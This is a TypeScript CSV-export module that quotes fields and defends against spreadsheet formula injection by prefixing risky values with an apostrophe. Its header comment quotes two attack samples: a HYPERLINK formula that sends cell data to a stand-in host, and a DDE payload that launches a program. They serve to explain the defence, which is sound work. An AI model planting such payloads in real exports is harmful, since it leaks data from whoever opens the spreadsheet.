/**
 * CSV writing, with the two things that go wrong.
 *
 * QUOTING is the obvious one: a comma, a quote or a newline inside a value breaks the row
 * unless the value is quoted and its quotes doubled. Addresses and driver notes contain
 * all three routinely.
 *
 * FORMULA INJECTION is the one that matters more, and it is a security bug rather than a
 * formatting one. Excel, LibreOffice and Google Sheets treat a cell beginning `=`, `+`,
 * `-`, `@`, tab or carriage return as a FORMULA and evaluate it on open. So a value like
 *
 *     =HYPERLINK("https://evil.example/"&A1,"Click for invoice")
 *
 * typed into a customer name or a delivery note becomes a live link in the spreadsheet a
 * hospital's procurement team opens — and `=cmd|'/c calc'!A1` has historically been worse
 * than that. Every field in these exports is attacker-influenced: a dispatcher types the
 * customer name and notes today, and once customers book their own jobs they type them
 * directly.
 *
 * The mitigation is to prefix a leading apostrophe, which spreadsheets read as "this is
 * text". It is visible in the cell, which is the trade: a slightly odd-looking value beats
 * a document that executes. It is applied ONLY to values that would otherwise be
 * interpreted, so ordinary text is untouched.
 */

/** Characters that make a spreadsheet treat a cell as a formula rather than text. */
const FORMULA_LEADERS = ["=", "+", "-", "@", "\t", "\r"];

export function neutralizeFormula(value: string): string {
  if (value.length === 0) return value;
  return FORMULA_LEADERS.includes(value[0]!) ? `'${value}` : value;
}

/** One field, quoted and escaped for CSV, and safe to open in a spreadsheet. */
export function csvField(value: string | number | null | undefined): string {
  if (value === null || value === undefined) return "";
  const raw = typeof value === "number" ? String(value) : neutralizeFormula(value);
  // Quote when it could otherwise be misread, and double any embedded quotes. Always
  // quoting would also be correct; quoting only when needed keeps the file readable.
  if (/[",\r\n]/.test(raw)) return `"${raw.replaceAll('"', '""')}"`;
  return raw;
}

export function csvRow(values: readonly (string | number | null | undefined)[]): string {
  return values.map(csvField).join(",");
}

/**
 * A whole document.
 *
 * CRLF line endings, because RFC 4180 says so and because Excel on Windows — which is
 * what a procurement team opens this in — is the least forgiving reader.
 */
export function csvDocument(
  header: readonly string[],
  rows: readonly (readonly (string | number | null | undefined)[])[],
): string {
  return [csvRow(header), ...rows.map(csvRow)].join("\r\n") + "\r\n";
}

/** ISO 8601 UTC, so the column sorts and parses everywhere. Empty for a missing date. */
export function csvTimestamp(value: Date | null | undefined): string {
  if (!value) return "";
  const time = value.getTime();
  if (!Number.isFinite(time)) return "";
  return value.toISOString();
}
